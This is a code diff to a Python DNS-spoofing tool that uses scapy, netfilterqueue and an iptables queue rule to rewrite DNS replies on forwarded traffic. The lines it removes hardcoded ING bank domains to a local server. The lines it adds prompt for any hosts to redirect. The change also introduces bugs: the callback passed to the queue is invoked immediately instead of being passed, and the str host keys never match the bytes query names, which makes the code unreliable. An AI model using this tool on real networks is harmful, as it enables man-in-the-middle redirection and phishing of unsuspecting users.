@@ -2,13 +2,8 @@ from scapy.all import *
 from netfilterqueue import NetfilterQueue
 import os
 
-web_server = "192.168.86.42"
-hosts = [b"ing.nl.", b"www.ing.nl.", b"api.www.ing.nl."]
 
-dns_hosts = {h: web_server for h in hosts}
-
-
-def process_packet(packet):
+def process_packet(packet, dns_hosts):
     # convert netfilter queue packet to scapy packet
     scapy_packet = IP(packet.get_payload())
     if scapy_packet.haslayer(DNSRR):
@@ -16,7 +11,7 @@ def process_packet(packet):
         # modify the packet
         print("[Before]:", scapy_packet.summary())
         try:
-            scapy_packet = modify_packet(scapy_packet)
+            scapy_packet = modify_packet(scapy_packet, dns_hosts)
         except IndexError:
             # not UDP packet, this can be IPerror/UDPerror packets
             pass
@@ -27,10 +22,10 @@ def process_packet(packet):
     packet.accept()
 
 
-def modify_packet(packet):
+def modify_packet(packet, dns_hosts):
     # get the DNS question name, the domain name
     qname = packet[DNSQR].qname
-    if qname not in hosts:
+    if qname not in dns_hosts:
         # if the website isn't in our record
         # we don't wanna modify that
         print("[Not Modified]:", qname)
@@ -51,6 +46,20 @@ def modify_packet(packet):
 
 
 if __name__ == "__main__":
+    # ask the user where server is located
+    web_server = input("Enter the IP address of the server: ")
+
+    dns_hosts = {}
+
+    # ask the user which hosts he wants to spoof
+    isDone = False
+    while not isDone:
+        host = input("Enter a host to spoof (e.g. www.google.com): ")
+        dns_hosts[host + "."] = web_server
+        another = input("Add another? (y/n): ")
+        if another.lower() == "n" or another.lower() == "no":
+            isDone = True
+
     QUEUE_NUM = 0
     # insert the iptables FORWARD rule
     os.system(f"sudo iptables -I FORWARD -j NFQUEUE --queue-num {QUEUE_NUM}")
@@ -60,7 +69,7 @@ if __name__ == "__main__":
     try:
         # bind the queue number to our callback `process_packet`
         # and start it
-        queue.bind(QUEUE_NUM, process_packet)
+        queue.bind(QUEUE_NUM, process_packet(dns_hosts))
         queue.run()
     except KeyboardInterrupt:
         # if want to exit, make sure we
